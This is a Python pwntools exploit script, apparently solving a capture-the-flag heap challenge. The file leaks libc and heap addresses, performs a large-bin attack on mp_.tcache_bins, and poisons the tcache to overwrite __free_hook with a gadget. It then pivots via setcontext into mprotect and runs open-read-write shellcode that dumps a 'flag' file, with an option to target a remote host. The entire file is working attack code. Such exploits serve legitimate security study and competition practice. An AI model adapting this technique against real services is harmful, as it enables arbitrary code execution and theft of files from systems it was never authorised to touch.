from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def create(idx, sz):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def edit(idx, content):
    opt(3)
    sla(b'Index: ', str(idx).encode())
    sa(b'Content: ', content)

def show(idx):
    opt(4)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def exp():
    create(0, 0x510)
    create(1, 0x500)
    create(2, 0x500)
    create(3, 0x500)

    delete(0)
    create(4, 0x800)
    show(0)
    org_fd = u64(rl()[:-1].ljust(8, b'\0'))
    arena_offset = 0x1ecb80
    libc.address = org_fd - arena_offset - 1168
    log.success(f'libc base: 0x{libc.address:x}')
    edit(0, b'a'*0x10)
    show(0)
    org_fd_nxt = u64(rl()[-7:-1].ljust(8, b'\0'))
    heap_base = org_fd_nxt & (~0xfff)
    log.success(f'heap base: 0x{heap_base:x}')

    mp_tcache_bins_offset = 0x1EC2D0
    fake_bk_nxt = libc.address + mp_tcache_bins_offset - 0x20
    edit(0, flat([org_fd, org_fd, org_fd_nxt, fake_bk_nxt]))

    delete(2)
    create(5, 0x800)
    # now mp_.tcache_bins = chunk2_address

    delete(3) # chunk3 should be treated as tcache chunk.

    # tcache poisoning: malloc to __free_hook
    payload_tcache_poisoning = flat({0xd*8: libc.sym.__free_hook})
    edit(0, payload_tcache_poisoning)

    create(3, 0x500)  
    
    # 0x0000000000151990 : 
    #   mov rdx, qword ptr [rdi + 8] ; 
    #   mov qword ptr [rsp], rax ; 
    #   call qword ptr [rdx + 0x20]
    gadget = 0x151990 + libc.address
    edit(3, p64(gadget))   # hijack __free_hook

    addr_ucontext = heap_base + 0x290 + 0x20
    addr_rop = addr_ucontext + 0xb0
    setcontext = libc.sym.setcontext + 0x3d
    mprotect = libc.sym.mprotect
    ucontext = flat({
        0x20: setcontext,
        0x28: 0,          # +0x28: r8
        0x30: 0,          # +0x30: r9
        0x48: 0,          # +0x48: r12
        0x50: 0,          # +0x50: r13
        0x58: 0,          # +0x58: r14
        0x60: 0,          # +0x60: r15
        0x68: heap_base,  # +0x68: rdi
        0x70: 0x21000,    # +0x70: rsi
        0x78: 0,          # +0x78: rbp
        0x80: 0,          # +0x80: rbx
        0x88: 7,          # +0x88: rdx
        0x98: 0,          # +0x98: rcx
        0xa0: addr_rop,   # +0xa0: rsp
        0xa8: mprotect    # +0xa8: rip
    })
    assert(len(ucontext) == 0xb0)

    addr_flag = heap_base + 0x00
    orw = shellcraft.open('flag')
    orw += shellcraft.read('rax', addr_flag, 0x100)
    orw += shellcraft.write(1, addr_flag, 0x100)
    orw = p64(addr_rop + 8) + asm(orw)
    payload = p64(addr_ucontext)*2 + ucontext + orw
    edit(0, payload)
    pid_pause()
    delete(0)


if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()